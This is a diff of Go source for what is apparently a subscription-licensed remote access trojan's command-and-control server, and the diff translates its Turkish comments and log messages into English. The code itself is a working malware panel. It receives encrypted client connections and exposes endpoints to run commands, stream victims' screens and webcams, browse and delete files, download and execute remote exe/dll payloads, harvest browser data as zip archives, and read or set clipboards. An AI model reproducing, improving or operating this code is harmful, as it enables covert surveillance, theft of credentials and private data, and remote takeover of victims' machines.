@@ -29,7 +29,7 @@ import (
 	"time"
 )
 
-// ─── TCP Listener (dinamik restart için) ──────────────────
+// --- TCP Listener (for dynamic restart) ---
 var (
 	tcpListener   net.Listener
 	tcpListenerMu sync.Mutex
@@ -75,7 +75,7 @@ func loadRSAPrivateKey() {
 	}
 }
 
-// ─── Config ───────────────────────────────────────────────
+// --- Config ---
 type Config struct {
 	Key               string `json:"key"`
 	HTTPPort          string `json:"http_port"`
@@ -94,10 +94,10 @@ func loadConfig() {
 	defer configMu.Unlock()
 	data, err := os.ReadFile("json/config.json")
 	if err != nil {
-		log.Fatal("config.json okunamadı:", err)
+		log.Fatal("config.json could not be read:", err)
 	}
 	if err := json.Unmarshal(data, &config); err != nil {
-		log.Fatal("config.json parse hatası:", err)
+		log.Fatal("config.json parse error:", err)
 	}
 	if config.HeartbeatInterval > 0 {
 		setHeartbeatInterval(config.HeartbeatInterval)
@@ -114,7 +114,7 @@ func saveConfig() error {
 	return os.WriteFile("json/config.json", data, 0644)
 }
 
-// ─── ID Üretici ───────────────────────────────────────────
+// --- ID Generator ---
 const idChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 
 func generateID() string {
@@ -126,7 +126,7 @@ func generateID() string {
 	return string(b)
 }
 
-// ─── Messaging Structures ─────────────────────────────────
+// --- Messaging Structures ---
 type Packet struct {
 	Data string `json:"data"` // base64 encrypted JSON message
 	IV   string `json:"iv"`   // base64 IV
@@ -141,7 +141,7 @@ type Handshake struct {
 	Session string `json:"session"` // base64(rsa_encrypt(aes_key + iv))
 }
 
-// ─── Crypto Helpers ───────────────────────────────────────
+// --- Crypto Helpers ---
 
 func aesEncrypt(plainText []byte, key, iv []byte) (string, error) {
 	block, err := aes.NewCipher(key)
@@ -200,14 +200,14 @@ func rsaDecrypt(encryptedB64 string) ([]byte, error) {
 	return rsa.DecryptPKCS1v15(crand.Reader, rsaPrivKey, data)
 }
 
-// ─── Shell Output Buffer ──────────────────────────────────
+// --- Shell Output Buffer ---
 type OutputEntry struct {
 	Kind string `json:"kind"`
 	Data string `json:"data"`
 	At   string `json:"at"`
 }
 
-// ─── Client Yönetimi ──────────────────────────────────────
+// --- Client Management ---
 const (
 	MaxOutputHistory = 200
 )
@@ -268,17 +268,17 @@ type Client struct {
 	// File Browser
 	FBResult string
 	FBReady  bool
-	FBKind   string // hangi komutun sonucu: ls, download, delete, mkdir, upload, rename
+	FBKind   string // result of which command: ls, download, delete, mkdir, upload, rename
 	// Remote File Execution
 	RFEResult string
 	RFEReady  bool
 	// Browser Data
-	// Client'tan [browser_zip]<isim>|<base64> gelince decode edilip burada tutulur.
-	// /api/browser/collect isteği gelince bytes doğrudan application/zip olarak tarayıcıya gönderilir.
-	BrowserZipName  string // örn. "Edge_extract.zip"
+	// Decoded and stored here when [browser_zip]<name>|<base64> is received from the client.
+	// When /api/browser/collect request arrives, bytes are sent directly to the browser as application/zip.
+	BrowserZipName  string // e.g. "Edge_extract.zip"
 	BrowserZipBytes []byte // zip binary
-	BrowserErrMsg   string // extraction başarısız olursa hata mesajı
-	BrowserReady    bool   // client cevap gönderdi mi
+	BrowserErrMsg   string // error message if extraction fails
+	BrowserReady    bool   // has the client sent a response?
 	// Clipboard Manager
 	ClipboardResult    string
 	ClipboardReady     bool
@@ -420,10 +420,10 @@ func sendCommandByID(id, cmd string) error {
 			return sendEncrypted(c, Message{Type: "command", Payload: cmd})
 		}
 	}
-	return fmt.Errorf("client bulunamadı: %s", id)
+	return fmt.Errorf("client not found: %s", id)
 }
 
-// ─── License Helper ───────────────────────────────────────
+// --- License Helper ---
 
 func checkLicense(key string) (string, string, error) {
 	nonce := strconv.FormatInt(mrand.Int63(), 16)
@@ -468,7 +468,7 @@ func broadcast(cmd string) {
 	}
 }
 
-// ─── Server Stats ─────────────────────────────────────────
+// --- Server Stats ---
 type Stats struct {
 	ClientCount int    `json:"client_count"`
 	Uptime      string `json:"uptime"`
@@ -513,7 +513,7 @@ func getStats() Stats {
 	}
 }
 
-// ─── TCP Server ───────────────────────────────────────────
+// --- TCP Server ---
 func startTCPServer() {
 	configMu.RLock()
 	port := config.TCPPort
@@ -521,12 +521,12 @@ func startTCPServer() {
 
 	ln, err := net.Listen("tcp", ":"+port)
 	if err != nil {
-		log.Fatal("TCP server başlatılamadı:", err)
+		log.Fatal("TCP server could not be started:", err)
 	}
 	tcpListenerMu.Lock()
 	tcpListener = ln
 	tcpListenerMu.Unlock()
-	log.Printf("TCP server başlatıldı → :%s", config.TCPPort)
+	log.Printf("TCP server started -> :%s", config.TCPPort)
 	acceptLoop(ln)
 }
 
@@ -534,10 +534,10 @@ func acceptLoop(ln net.Listener) {
 	for {
 		conn, err := ln.Accept()
 		if err != nil {
-			// Listener kapatıldıysa (port değişimi) sessizce çık
+			// If listener was closed (port change) exit quietly
 			select {
 			default:
-				log.Println("TCP accept hatası:", err)
+				log.Println("TCP accept error:", err)
 			}
 			return
 		}
@@ -545,7 +545,7 @@ func acceptLoop(ln net.Listener) {
 	}
 }
 
-// Tüm bağlı clientlerin conn'larını kapatır ve listeyi temizler
+// Closes connections of all connected clients and clears the list
 func disconnectAllClients() {
 	clientsMu.Lock()
 	defer clientsMu.Unlock()
@@ -555,15 +555,15 @@ func disconnectAllClients() {
 	clients = nil
 }
 
-// Mevcut listener'ı kapatır, tüm clientleri koparır, yeni portta yeniden başlatır
+// Closes current listener, disconnects all clients, restarts on new port
 func restartTCPServer(newPort string) error {
-	// Önce yeni portu dinlemeye çalış — başarısız olursa hiçbir şeyi bozma
+	// Try to listen on new port first - if fails, don't break anything
 	ln, err := net.Listen("tcp", ":"+newPort)
 	if err != nil {
-		return fmt.Errorf("TCP port %s dinlenemiyor: %w", newPort, err)
+		return fmt.Errorf("TCP port %s cannot be listened on: %w", newPort, err)
 	}
 
-	// Eski listener'ı kapat
+	// Close old listener
 	tcpListenerMu.Lock()
 	old := tcpListener
 	tcpListener = ln
@@ -573,47 +573,47 @@ func restartTCPServer(newPort string) error {
 		old.Close()
 	}
 
-	// Tüm mevcut bağlantıları kapat ve listeyi temizle
+	// Close all current connections and clear list
 	disconnectAllClients()
 
-	log.Printf("TCP server yeni portta başlatıldı → :%s", newPort)
+	log.Printf("TCP server started on new port -> :%s", newPort)
 	go acceptLoop(ln)
 	return nil
 }
 
 func handleTCPClient(conn net.Conn) {
 	scanner := bufio.NewScanner(conn)
-	// Büyük dosya transferleri için buffer boyutu: 150 MB
+	// Buffer size for large file transfers: 150 MB
 	const maxScanBuf = 150 * 1024 * 1024
 	scanner.Buffer(make([]byte, 64*1024), maxScanBuf)
 
-	// 1. Handshake bekle
+	// 1. Wait for Handshake
 	if !scanner.Scan() {
 		conn.Close()
 		return
 	}
 	var hs Handshake
 	if err := json.Unmarshal(scanner.Bytes(), &hs); err != nil {
-		log.Printf("[TCP] Geçersiz handshake: %v", err)
+		log.Printf("[TCP] Invalid handshake: %v", err)
 		conn.Close()
 		return
 	}
 
 	sessionData, err := rsaDecrypt(hs.Session)
 	if err != nil {
-		log.Printf("[TCP] RSA decrypt hatası: %v", err)
+		log.Printf("[TCP] RSA decrypt error: %v", err)
 		conn.Close()
 		return
 	}
 	if len(sessionData) != 48 {
-		log.Printf("[TCP] Geçersiz session verisi uzunluğu: %d (48 beklenen)", len(sessionData))
+		log.Printf("[TCP] Invalid session data length: %d (48 expected)", len(sessionData))
 		conn.Close()
 		return
 	}
 
 	id := generateID()
 	ip := conn.RemoteAddr().String()
-	log.Printf("[TCP] Bağlandı (Şifreli): %s (ID: %s)", ip, id)
+	log.Printf("[TCP] Connected (Encrypted): %s (ID: %s)", ip, id)
 
 	client := &Client{
 		ID:          id,
@@ -629,7 +629,7 @@ func handleTCPClient(conn net.Conn) {
 	defer func() {
 		conn.Close()
 		removeClientByID(id)
-		log.Printf("[TCP] Ayrıldı: %s (ID: %s)", ip, id)
+		log.Printf("[TCP] Disconnected: %s (ID: %s)", ip, id)
 	}()
 
 	go func() {
@@ -655,25 +655,25 @@ func handleTCPClient(conn net.Conn) {
 		line := scanner.Text()
 		var packet Packet
 		if err := json.Unmarshal([]byte(line), &packet); err != nil {
-			log.Printf("[TCP][%s] JSON parse hatası: %v", id, err)
+			log.Printf("[TCP][%s] JSON parse error: %v", id, err)
 			continue
 		}
 
 		packetIV, err := base64.StdEncoding.DecodeString(packet.IV)
 		if err != nil {
-			log.Printf("[TCP][%s] IV decode hatası", id)
+			log.Printf("[TCP][%s] IV decode error", id)
 			continue
 		}
 
 		decrypted, err := aesDecrypt(packet.Data, client.aesKey, packetIV)
 		if err != nil {
-			log.Printf("[TCP][%s] Deşifre hatası: %v", id, err)
+			log.Printf("[TCP][%s] Decryption error: %v", id, err)
 			continue
 		}
 
 		var msg Message
 		if err := json.Unmarshal(decrypted, &msg); err != nil {
-			log.Printf("[TCP][%s] Message JSON hatası: %v", id, err)
+			log.Printf("[TCP][%s] Message JSON error: %v", id, err)
 			continue
 		}
 		client.updatePong()
@@ -797,7 +797,7 @@ func handleTCPClient(conn net.Conn) {
 	}
 }
 
-// ─── Auth & Session Management ────────────────────────────
+// --- Auth & Session Management ---
 type Session struct {
 	ID        string
 	ExpiresAt time.Time
@@ -858,7 +858,7 @@ func writeJSONError(w http.ResponseWriter, message string, code int) {
 	json.NewEncoder(w).Encode(map[string]string{"error": message})
 }
 
-// ─── HTTP Handlers ────────────────────────────────────────
+// --- HTTP Handlers ---
 func indexHandler(w http.ResponseWriter, r *http.Request) {
 	if r.URL.Path != "/" {
 		http.NotFound(w, r)
@@ -925,7 +925,7 @@ func loginPostHandler(w http.ResponseWriter, r *http.Request) {
 		http.Error(w, "Server Error", 500)
 		return
 	}
-	if err := tmpl.Execute(w, map[string]string{"Error": "Geçersiz key!"}); err != nil {
+	if err := tmpl.Execute(w, map[string]string{"Error": "Invalid key!"}); err != nil {
 		log.Printf("Execution error: %v", err)
 	}
 }
@@ -981,9 +981,9 @@ func apiSendHandler(w http.ResponseWriter, r *http.Request) {
 		writeJSONError(w, "Invalid request", 400)
 		return
 	}
-	log.Printf("[API] Send → id=%s cmd=%s", req.ID, req.Cmd)
+	log.Printf("[API] Send -> id=%s cmd=%s", req.ID, req.Cmd)
 	if err := sendCommandByID(req.ID, req.Cmd); err != nil {
-		log.Printf("[API] Send hata: %s", err)
+		log.Printf("[API] Send error: %s", err)
 		http.Error(w, err.Error(), 404)
 		return
 	}
@@ -1014,7 +1014,7 @@ func apiOutputHandler(w http.ResponseWriter, r *http.Request) {
 	id := r.URL.Query().Get("id")
 	client := getClientByID(id)
 	if client == nil {
-		http.Error(w, "client bulunamadı", 404)
+		http.Error(w, "client not found", 404)
 		return
 	}
 	w.Header().Set("Content-Type", "application/json")
@@ -1030,7 +1030,7 @@ func apiStatsHandler(w http.ResponseWriter, r *http.Request) {
 	json.NewEncoder(w).Encode(getStats())
 }
 
-// GET /api/screen?id=X → son frame base64 JPEG
+// GET /api/screen?id=X -> last frame base64 JPEG
 func apiScreenHandler(w http.ResponseWriter, r *http.Request) {
 	if !isAPIAuthorized(r) {
 		writeJSONError(w, "Unauthorized", 401)
@@ -1039,7 +1039,7 @@ func apiScreenHandler(w http.ResponseWriter, r *http.Request) {
 	id := r.URL.Query().Get("id")
 	client := getClientByID(id)
 	if client == nil {
-		http.Error(w, "client bulunamadı", 404)
+		http.Error(w, "client not found", 404)
 		return
 	}
 	client.mu.Lock()
@@ -1070,7 +1070,7 @@ func apiScreenCtrlHandler(w http.ResponseWriter, r *http.Request) {
 	}
 	client := getClientByID(req.ID)
 	if client == nil {
-		http.Error(w, "client bulunamadı", 404)
+		http.Error(w, "client not found", 404)
 		return
 	}
 	fps := req.FPS
@@ -1100,7 +1100,7 @@ func apiScreenCtrlHandler(w http.ResponseWriter, r *http.Request) {
 	w.WriteHeader(200)
 }
 
-// GET /api/screen/status?id=X → screening aktif mi
+// GET /api/screen/status?id=X -> is screening active
 func apiScreenStatusHandler(w http.ResponseWriter, r *http.Request) {
 	if !isAPIAuthorized(r) {
 		writeJSONError(w, "Unauthorized", 401)
@@ -1109,7 +1109,7 @@ func apiScreenStatusHandler(w http.ResponseWriter, r *http.Request) {
 	id := r.URL.Query().Get("id")
 	client := getClientByID(id)
 	if client == nil {
-		http.Error(w, "client bulunamadı", 404)
+		http.Error(w, "client not found", 404)
 		return
 	}
 	client.mu.Lock()
@@ -1120,7 +1120,7 @@ func apiScreenStatusHandler(w http.ResponseWriter, r *http.Request) {
 }
 
 
-// GET /api/cam?id=X → son kamera frame
+// GET /api/cam?id=X -> last camera frame
 func apiCamHandler(w http.ResponseWriter, r *http.Request) {
 	if !isAPIAuthorized(r) {
 		writeJSONError(w, "Unauthorized", 401)
@@ -1129,7 +1129,7 @@ func apiCamHandler(w http.ResponseWriter, r *http.Request) {
 	id := r.URL.Query().Get("id")
 	client := getClientByID(id)
 	if client == nil {
-		http.Error(w, "client bulunamadı", 404)
+		http.Error(w, "client not found", 404)
 		return
 	}
 	client.mu.Lock()
@@ -1160,7 +1160,7 @@ func apiCamCtrlHandler(w http.ResponseWriter, r *http.Request) {
 	}
 	client := getClientByID(req.ID)
 	if client == nil {
-		http.Error(w, "client bulunamadı", 404)
+		http.Error(w, "client not found", 404)
 		return
 	}
 	fps := req.FPS
@@ -1194,7 +1194,7 @@ func apiCamStatusHandler(w http.ResponseWriter, r *http.Request) {
 	id := r.URL.Query().Get("id")
 	client := getClientByID(id)
 	if client == nil {
-		http.Error(w, "client bulunamadı", 404)
+		http.Error(w, "client not found", 404)
 		return
 	}
 	client.mu.Lock()
@@ -1225,7 +1225,7 @@ func apiTasklistHandler(w http.ResponseWriter, r *http.Request) {
 	}
 
 	client := getClientByID(id)
-	if client == nil { http.Error(w, "client bulunamadı", 404); return }
+	if client == nil { http.Error(w, "client not found", 404); return }
 
 	client.mu.Lock()
 	client.TasklistReady = false
@@ -1257,7 +1257,7 @@ func apiTaskkillHandler(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	// pid hem string hem int olarak gelebilir
+	// pid can come as both string and int
 	var raw struct {
 		ID  string          `json:"id"`
 		PID json.RawMessage `json:"pid"`
@@ -1267,7 +1267,7 @@ func apiTaskkillHandler(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	// pid'i string'e çevir (int ya da string olabilir)
+	// Convert pid to string (can be int or string)
 	pidStr := strings.Trim(string(raw.PID), `"`)
 
 	if err := sendCommandByID(raw.ID, fmt.Sprintf("[taskkill]%s", pidStr)); err != nil {
@@ -1277,11 +1277,11 @@ func apiTaskkillHandler(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	// Client'tan [taskkill_result] gelmesini bekle
+	// Wait for [taskkill_result] from client
 	client := getClientByID(raw.ID)
 	if client == nil {
 		w.Header().Set("Content-Type", "application/json")
-		json.NewEncoder(w).Encode(map[string]interface{}{"success": true, "message": "komut gönderildi"})
+		json.NewEncoder(w).Encode(map[string]interface{}{"success": true, "message": "command sent"})
 		return
 	}
 
@@ -1296,7 +1296,7 @@ func apiTaskkillHandler(w http.ResponseWriter, r *http.Request) {
 			msg := result
 			if idx := strings.Index(result, ":"); idx >= 0 { msg = result[idx+1:] }
 			json.NewEncoder(w).Encode(map[string]interface{}{"success": success, "message": strings.TrimSpace(msg)})
-			// Sonucu sıfırla
+			// Reset result
 			client.mu.Lock()
 			client.LastKillResult = ""
 			client.mu.Unlock()
@@ -1304,15 +1304,15 @@ func apiTaskkillHandler(w http.ResponseWriter, r *http.Request) {
 		}
 		time.Sleep(100 * time.Millisecond)
 	}
-	// Timeout ama komut gönderildi, başarılı say
+	// Timeout but command was sent, consider success
 	w.Header().Set("Content-Type", "application/json")
-	json.NewEncoder(w).Encode(map[string]interface{}{"success": true, "message": "komut gönderildi"})
+	json.NewEncoder(w).Encode(map[string]interface{}{"success": true, "message": "command sent"})
 }
 
-// ─── File Browser yardımcısı ──────────────────────────────
+// --- File Browser Helper ---
 func fbRequest(w http.ResponseWriter, id, cmd, resultKind string, timeoutSec int) {
 	client := getClientByID(id)
-	if client == nil { http.Error(w, "client bulunamadı", 404); return }
+	if client == nil { http.Error(w, "client not found", 404); return }
 
 	client.mu.Lock()
 	client.FBReady  = false
@@ -1434,24 +1434,24 @@ func apiRFEHandler(w http.ResponseWriter, r *http.Request) {
 	var req struct {
 		ID   string `json:"id"`
 		URL  string `json:"url"`
-		Type string `json:"type"` // "exe" veya "dll"
+		Type string `json:"type"` // "exe" or "dll"
 		Args string `json:"args"`
 	}
 	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
-		http.Error(w, "Geçersiz istek", 400)
+		http.Error(w, "Invalid request", 400)
 		return
 	}
 	if req.ID == "" || req.URL == "" {
-		http.Error(w, "id ve url zorunlu", 400)
+		http.Error(w, "id and url are mandatory", 400)
 		return
 	}
 	if req.Type != "exe" && req.Type != "dll" {
-		http.Error(w, "type 'exe' veya 'dll' olmalı", 400)
+		http.Error(w, "type must be 'exe' or 'dll'", 400)
 		return
 	}
 	client := getClientByID(req.ID)
 	if client == nil {
-		http.Error(w, "client bulunamadı", 404)
+		http.Error(w, "client not found", 404)
 		return
 	}
 	client.mu.Lock()
@@ -1459,7 +1459,7 @@ func apiRFEHandler(w http.ResponseWriter, r *http.Request) {
 	client.RFEResult = ""
 	client.mu.Unlock()
 
-	// Komut formatı: [rfe_exe]url|args  veya  [rfe_dll]url
+	// Command format: [rfe_exe]url|args  or  [rfe_dll]url
 	var cmd string
 	if req.Type == "exe" {
 		cmd = fmt.Sprintf("[rfe_exe]%s|%s", req.URL, req.Args)
@@ -1497,16 +1497,16 @@ func apiRFEHandler(w http.ResponseWriter, r *http.Request) {
 	http.Error(w, "timeout: client cevap vermedi", 504)
 }
 
-// ─── Browser Collect ──────────────────────────────────────
+// --- Browser Collect ---
 //
 // POST /api/browser/collect { "id":"...", "browser":"Chrome"|"Edge"|"Brave"|"Opera"|"OperaGX" }
 //
-// Her zaman JSON döner:
-//   Başarı: { "ok": true,  "name": "<zip_adi>", "data": "<base64_zip>" }
-//   Hata:   { "ok": false, "error": "<mesaj>" }
+// Always returns JSON:
+//   Success: { "ok": true,  "name": "<zip_name>", "data": "<base64_zip>" }
+//   Error:   { "ok": false, "error": "<message>" }
 //
-// Frontend bu JSON'u parse edip base64'ü blob'a çevirerek indirir.
-// Böylece Content-Type karışıklığından kaynaklanan JSON parse hatası olmaz.
+// Frontend parses this JSON and converts base64 to blob for downloading.
+// This prevents JSON parse errors caused by Content-Type confusion.
 func apiBrowserCollectHandler(w http.ResponseWriter, r *http.Request) {
 	if !isAPIAuthorized(r) {
 		writeJSONError(w, "Unauthorized", 401)
@@ -1522,11 +1522,11 @@ func apiBrowserCollectHandler(w http.ResponseWriter, r *http.Request) {
 	}
 	client := getClientByID(req.ID)
 	if client == nil {
-		http.Error(w, "client bulunamadı", 404)
+		http.Error(w, "client not found", 404)
 		return
 	}
 
-	// Durumu sıfırla
+	// Reset state
 	client.mu.Lock()
 	client.BrowserReady    = false
 	client.BrowserZipBytes = nil
@@ -1534,7 +1534,7 @@ func apiBrowserCollectHandler(w http.ResponseWriter, r *http.Request) {
 	client.BrowserErrMsg   = ""
 	client.mu.Unlock()
 
-	// Komutu gönder
+	// Send command
 	cmd := fmt.Sprintf("[browser_collect]%s", req.Browser)
 	if err := sendCommandByID(req.ID, cmd); err != nil {
 		w.Header().Set("Content-Type", "application/json")
@@ -1543,7 +1543,7 @@ func apiBrowserCollectHandler(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	// Browser extraction uzun sürebilir (debug + profil çıkarma): 3 dakika bekle
+	// Browser extraction may take long: wait 3 minutes
 	deadline := time.Now().Add(3 * time.Minute)
 	for time.Now().Before(deadline) {
 		client.mu.Lock()
@@ -1556,7 +1556,7 @@ func apiBrowserCollectHandler(w http.ResponseWriter, r *http.Request) {
 		if ready {
 			w.Header().Set("Content-Type", "application/json")
 			if errMsg != "" {
-				// Hata durumu — JSON olarak döndür
+				// Error state - return as JSON
 				w.WriteHeader(500)
 				json.NewEncoder(w).Encode(map[string]interface{}{
 					"ok":    false,
@@ -1564,8 +1564,8 @@ func apiBrowserCollectHandler(w http.ResponseWriter, r *http.Request) {
 				})
 				return
 			}
-			// Başarı — zip'i base64 olarak JSON içinde döndür
-			// Frontend blob oluşturup otomatik indirir
+			// Success - return zip as base64 in JSON
+			// Frontend creates blob and downloads automatically
 			b64 := base64.StdEncoding.EncodeToString(zipBytes)
 			json.NewEncoder(w).Encode(map[string]interface{}{
 				"ok":   true,
@@ -1580,11 +1580,11 @@ func apiBrowserCollectHandler(w http.ResponseWriter, r *http.Request) {
 	w.WriteHeader(504)
 	json.NewEncoder(w).Encode(map[string]interface{}{
 		"ok":    false,
-		"error": "timeout: browser extraction tamamlanamadı",
+		"error": "timeout: browser extraction could not be completed",
 	})
 }
 
-// ─── Clipboard Manager ────────────────────────────────────
+// --- Clipboard Manager ---
 // POST /api/clipboard/get  { "id":"..." }
 func apiClipboardGetHandler(w http.ResponseWriter, r *http.Request) {
 	if !isAPIAuthorized(r) {
@@ -1595,12 +1595,12 @@ func apiClipboardGetHandler(w http.ResponseWriter, r *http.Request) {
 		ID string `json:"id"`
 	}
 	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
-		http.Error(w, "Geçersiz istek", 400)
+		http.Error(w, "Invalid request", 400)
 		return
 	}
 	client := getClientByID(req.ID)
 	if client == nil {
-		http.Error(w, "client bulunamadı", 404)
+		http.Error(w, "client not found", 404)
 		return
 	}
 
@@ -1641,12 +1641,12 @@ func apiClipboardSetHandler(w http.ResponseWriter, r *http.Request) {
 		Text string `json:"text"`
 	}
 	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
-		http.Error(w, "Geçersiz istek", 400)
+		http.Error(w, "Invalid request", 400)
 		return
 	}
 	client := getClientByID(req.ID)
 	if client == nil {
-		http.Error(w, "client bulunamadı", 404)
+		http.Error(w, "client not found", 404)
 		return
 	}
 
@@ -1655,7 +1655,7 @@ func apiClipboardSetHandler(w http.ResponseWriter, r *http.Request) {
 	client.ClipboardSetResult = ""
 	client.mu.Unlock()
 
-	// Satır sonlarını escape'le (tek satır protokolü)
+	// Escape newlines (single line protocol)
 	escaped := strings.ReplaceAll(req.Text, "\n", "\\n")
 	escaped  = strings.ReplaceAll(escaped, "\r", "")
 	cmd := fmt.Sprintf("[clipboard_set]%s", escaped)
@@ -1686,7 +1686,7 @@ func apiClipboardSetHandler(w http.ResponseWriter, r *http.Request) {
 	http.Error(w, "timeout: client cevap vermedi", 504)
 }
 
-// ─── Settings ─────────────────────────────────────────────
+// --- Settings ---
 func apiSettingsHandler(w http.ResponseWriter, r *http.Request) {
 	if !isAPIAuthorized(r) {
 		writeJSONError(w, "Unauthorized", 401)
@@ -1756,7 +1756,7 @@ func apiClientUpdateHandler(w http.ResponseWriter, r *http.Request) {
 	}
 	client := getClientByID(req.ID)
 	if client == nil {
-		http.Error(w, "client bulunamadı", 404)
+		http.Error(w, "client not found", 404)
 		return
 	}
 
@@ -1786,29 +1786,29 @@ func logoutHandler(w http.ResponseWriter, r *http.Request) {
 	http.Redirect(w, r, "/login", http.StatusFound)
 }
 
-// ─── Main ─────────────────────────────────────────────────
+// --- Main ---
 func main() {
 	loadConfig()
 	loadRSAPrivateKey()
 
 	// 1. License Server Reachability Check
-	fmt.Println("Lisans sunucusu kontrol ediliyor...")
+	fmt.Println("Checking license server...")
 	resp, err := http.Get(licenseServerURL + "?key=check")
 	if err != nil {
-		fmt.Printf("Hata: Lisans sunucusuna erişilemiyor! (%v)\n", err)
+		fmt.Printf("Error: License server is unreachable! (%v)\n", err)
 		os.Exit(1)
 	}
 	resp.Body.Close()
 
 	// 2. Initial License Check
 	reader := bufio.NewReader(os.Stdin)
-	fmt.Print("Lütfen Lisans Anahtarınızı Girin: ")
+	fmt.Print("Please Enter Your License Key: ")
 	inputKey, _ := reader.ReadString('\n')
 	inputKey = strings.TrimSpace(inputKey)
 
 	status, expiry, err := checkLicense(inputKey)
 	if err != nil {
-		fmt.Printf("Lisans kontrolü sırasında hata oluştu: %v\n", err)
+		fmt.Printf("Error occurred during license check: %v\n", err)
 		os.Exit(1)
 	}
 
@@ -1816,15 +1816,15 @@ func main() {
 	case "valid":
 		currentLicenseKey = inputKey
 		currentLicenseExpiry = expiry
-		fmt.Printf("✔ Lisans Onaylandı! (Bitiş: %s)\n", expiry)
+		fmt.Printf("[SUCCESS] License Approved! (Expiry: %s)\n", expiry)
 	case "expired":
-		fmt.Println("❌ Abonelik süreniz bitti.")
+		fmt.Println("[ERROR] Your subscription has expired.")
 		os.Exit(1)
 	case "invalid key":
-		fmt.Println("❌ Aboneliğiniz yok.")
+		fmt.Println("[ERROR] No valid subscription found.")
 		os.Exit(1)
 	default:
-		fmt.Printf("❌ Lisans hatası: %s\n", status)
+		fmt.Printf("[ERROR] License error: %s\n", status)
 		os.Exit(1)
 	}
 
@@ -1872,6 +1872,6 @@ func main() {
 	hPort := config.HTTPPort
 	configMu.RUnlock()
 
-	fmt.Printf("HTTP server başlatıldı → http://localhost:%s\n", hPort)
+	fmt.Printf("HTTP server started -> http://localhost:%s\n", hPort)
 	log.Fatal(http.ListenAndServe(":"+hPort, nil))
 }
